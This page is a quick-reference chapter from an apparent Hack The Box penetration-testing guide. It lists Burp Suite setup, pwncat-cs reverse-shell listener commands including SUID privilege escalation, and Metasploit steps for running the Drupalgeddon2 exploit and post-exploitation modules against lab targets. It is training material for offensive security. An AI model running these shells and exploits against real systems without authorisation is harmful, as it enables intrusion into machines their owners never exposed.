[◀ Prev: Exploit Development](15-exploit-development.md) · [🏠 Index](README.md) · [Next: Master Cheatsheet ▶](17-master-cheatsheet.md)

---

# 16 · Tools & Quick Reference

## 16.1 Essential Tool Commands

### Burp Suite Setup for HTB

```text
# Configure browser proxy: 127.0.0.1:8080
# Add HTB target scope: Target -> Scope -> Add
#   *.$TARGET.htb, $TARGET_IP

# Key Burp shortcuts:
#   Ctrl+I = Send to Intruder
#   Ctrl+R = Send to Repeater
#   Ctrl+S = Search

# Burp extensions useful for HTB:
#   - ActiveScan++ (more scanner checks)
#   - JWT Editor (JWT attacks)
#   - HTTP Request Smuggler
#   - Upload Scanner
#   - Param Miner (parameter discovery)
```

### pwncat-cs — Advanced Shell Handler

```bash
# Start listener
pwncat-cs -lp 4444

# Commands in pwncat (after shell received):
# Ctrl+D = Switch between pwncat menu and shell
upload /local/file /remote/path
download /remote/file /local/path
back    # Return to shell

# Run modules
run enumerate       # Run all enumeration modules
run escalate.suid   # Try SUID escalation
```

## 16.2 Metasploit for HTB

```bash
# HTB-appropriate Metasploit usage
msfconsole -q

# Search for module
search type:exploit name:apache
search cve:2021

# Use and configure
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS $TARGET
set LHOST tun0
set LPORT 4444
run

# Post-exploitation modules
use post/linux/gather/enum_system
use post/multi/recon/local_exploit_suggester

# Upgrade shell to meterpreter
sessions -u SESSION_ID
```

---

[◀ Prev: Exploit Development](15-exploit-development.md) · [🏠 Index](README.md) · [Next: Master Cheatsheet ▶](17-master-cheatsheet.md)
